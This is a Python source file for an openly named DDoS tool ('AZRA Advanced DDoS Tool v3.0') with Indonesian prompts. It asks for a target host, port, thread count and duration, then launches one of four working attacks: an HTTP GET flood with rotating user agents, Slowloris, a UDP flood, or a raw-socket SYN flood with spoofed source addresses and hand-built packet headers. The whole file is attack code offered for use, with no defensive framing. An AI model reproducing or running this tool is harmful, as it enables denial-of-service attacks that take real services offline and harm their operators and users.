#script by mhd.naufal azra duha
import socket
import threading
import time
import random
import os
import sys
import struct
import ssl
from urllib.parse import urlparse

def display_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = """
    ╔═══╗╔═══╗╔═══╗╔═══╗
    ║╔═╗║║╔═╗║║╔═╗║║╔══╝
    ║║ ║║║╚═╝║║╚═╝║║╚══╗
    ║╚═╝║║╔══╝║╔╗╔╝║╔══╝
    ║╔═╗║║║   ║║║╚╗║╚══╗
    ╚╝ ╚╝╚╝   ╚╝╚═╝╚═══╝
    
    AZRA Advanced DDoS Tool v3.0
    Multi-Method Attack Tool
    """
    print(banner)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

class AZRAAttack:
    def __init__(self):
        self.target = ""
        self.target_ip = ""
        self.port = 80
        self.num_bots = 100
        self.attack_num = 0
        self.is_attacking = False
        self.threads = []
        self.attack_method = "HTTP"
        self.attack_duration = 0
        self.start_time = 0
        
    def resolve_dns(self, hostname):
        try:
            return socket.gethostbyname(hostname)
        except:
            return hostname
    
    def get_user_input(self):
        display_banner()
        print("[+] Masukkan detail target:")
        url = input("Target URL/IP: ").strip()
        
        if "://" in url:
            parsed = urlparse(url)
            self.target = parsed.hostname
        else:
            self.target = url.split("/")[0]
        
        self.target_ip = self.resolve_dns(self.target)
        
        try:
            port_input = input("Port (default 80): ")
            self.port = int(port_input) if port_input else 80
        except ValueError:
            self.port = 80
            
        while True:
            try:
                bots_input = input("Jumlah BOT (1-1000, default 100): ")
                self.num_bots = int(bots_input) if bots_input else 100
                if 1 <= self.num_bots <= 1000:
                    break
                else:
                    print("Jumlah BOT harus antara 1-1000")
            except ValueError:
                self.num_bots = 100
                break
                
        print("\nPilih metode serangan:")
        print("1. HTTP Flood (Default)")
        print("2. Slowloris")
        print("3. UDP Flood")
        print("4. TCP SYN Flood")
        method = input("Pilihan (1-4): ")
        
        if method == "2":
            self.attack_method = "SLOWLORIS"
        elif method == "3":
            self.attack_method = "UDP"
        elif method == "4":
            self.attack_method = "SYN"
        else:
            self.attack_method = "HTTP"
            
        try:
            duration = input("Durasi serangan (detik, 0=tak terbatas): ")
            self.attack_duration = int(duration) if duration else 0
        except ValueError:
            self.attack_duration = 0
    
    def http_flood(self):
        while self.is_attacking and (self.attack_duration == 0 or time.time() - self.start_time < self.attack_duration):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target_ip, self.port))
                
                path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(5, 15)))
                user_agent = random.choice(USER_AGENTS)
                
                if self.port == 443:
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=self.target)
                
                request = f"GET {path} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n"
                s.send(request.encode())
                
                time.sleep(0.1)
                s.close()
                
                self.attack_num += 1
                if self.attack_num % 10 == 0:
                    print(f"[AZRA] HTTP Flood: {self.attack_num} requests to {self.target}")
                    
            except Exception:
                continue
    
    def slowloris(self):
        while self.is_attacking and (self.attack_duration == 0 or time.time() - self.start_time < self.attack_duration):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((self.target_ip, self.port))
                
                s.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
                
                while self.is_attacking and (self.attack_duration == 0 or time.time() - self.start_time < self.attack_duration):
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(random.randint(10, 30))
                    
                s.close()
                
            except Exception:
                continue
    
    def udp_flood(self):
        while self.is_attacking and (self.attack_duration == 0 or time.time() - self.start_time < self.attack_duration):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                data = random._urandom(1024)
                s.sendto(data, (self.target_ip, self.port))
                
                self.attack_num += 1
                if self.attack_num % 50 == 0:
                    print(f"[AZRA] UDP Flood: {self.attack_num} packets to {self.target_ip}:{self.port}")
                    
            except Exception:
                continue
    
    def syn_flood(self):
        while self.is_attacking and (self.attack_duration == 0 or time.time() - self.start_time < self.attack_duration):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                
                ip_ver_ihl = 69
                ip_tos = 0
                ip_tot_len = 0
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = 255
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(source_ip)
                ip_daddr = socket.inet_aton(self.target_ip)
                
                ip_header = struct.pack('!BBHHHBBH4s4s', 
                                      ip_ver_ihl, ip_tos, ip_tot_len, ip_id,
                                      ip_frag_off, ip_ttl, ip_proto, ip_check,
                                      ip_saddr, ip_daddr)
                
                tcp_source = random.randint(1024, 65535)
                tcp_dest = self.port
                tcp_seq = random.randint(1, 4294967295)
                tcp_ack_seq = 0
                tcp_doff = 5
                tcp_fin = 0
                tcp_syn = 1
                tcp_rst = 0
                tcp_psh = 0
                tcp_ack = 0
                tcp_urg = 0
                tcp_window = socket.htons(5840)
                tcp_check = 0
                tcp_urg_ptr = 0
                
                tcp_offset_res = (tcp_doff << 4) + 0
                tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
                
                tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq,
                                       tcp_ack_seq, tcp_offset_res, tcp_flags,
                                       tcp_window, tcp_check, tcp_urg_ptr)
                
                source_address = socket.inet_aton(source_ip)
                dest_address = socket.inet_aton(self.target_ip)
                placeholder = 0
                protocol = socket.IPPROTO_TCP
                tcp_length = len(tcp_header)
                
                psh = struct.pack('!4s4sBBH', source_address, dest_address,
                                placeholder, protocol, tcp_length)
                psh = psh + tcp_header
                
                tcp_check = self.checksum(psh)
                
                tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq,
                                       tcp_ack_seq, tcp_offset_res, tcp_flags,
                                       tcp_window, tcp_check, tcp_urg_ptr)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (self.target_ip, 0))
                
                self.attack_num += 1
                if self.attack_num % 50 == 0:
                    print(f"[AZRA] SYN Flood: {self.attack_num} packets to {self.target_ip}:{self.port}")
                    
            except Exception:
                continue
    
    def checksum(self, data):
        s = 0
        n = len(data) % 2
        for i in range(0, len(data)-n, 2):
            s += (data[i] << 8) + data[i+1]
        if n:
            s += (data[i+1] << 8)
        while (s >> 16):
            s = (s & 0xFFFF) + (s >> 16)
        s = ~s & 0xFFFF
        return s
    
    def start_attack(self):
        self.get_user_input()
        
        print(f"\n[AZRA] Memulai {self.attack_method} attack ke {self.target} ({self.target_ip}:{self.port})")
        print(f"[AZRA] Menggunakan {self.num_bots} BOT")
        if self.attack_duration > 0:
            print(f"[AZRA] Durasi: {self.attack_duration} detik")
        print("[AZRA] Tekan Ctrl+C untuk menghentikan serangan\n")
        
        self.is_attacking = True
        self.attack_num = 0
        self.start_time = time.time()
        
        attack_func = self.http_flood
        if self.attack_method == "SLOWLORIS":
            attack_func = self.slowloris
        elif self.attack_method == "UDP":
            attack_func = self.udp_flood
        elif self.attack_method == "SYN":
            attack_func = self.syn_flood
        
        for i in range(self.num_bots):
            thread = threading.Thread(target=attack_func)
            thread.daemon = True
            self.threads.append(thread)
        
        for thread in self.threads:
            thread.start()
        
        try:
            while self.is_attacking and (self.attack_duration == 0 or time.time() - self.start_time < self.attack_duration):
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        self.is_attacking = False
        print("\n[AZRA] Menghentikan serangan...")
        print(f"[AZRA] Total packets/requests dikirim: {self.attack_num}")
        time.sleep(2)
        print("[AZRA] Serangan dihentikan")

if __name__ == "__main__":
    try:
        attack_tool = AZRAAttack()
        attack_tool.start_attack()
    except KeyboardInterrupt:
        print("\n[AZRA] Dihentikan oleh pengguna")
    except Exception as e:
        print(f"[AZRA] Error: {e}")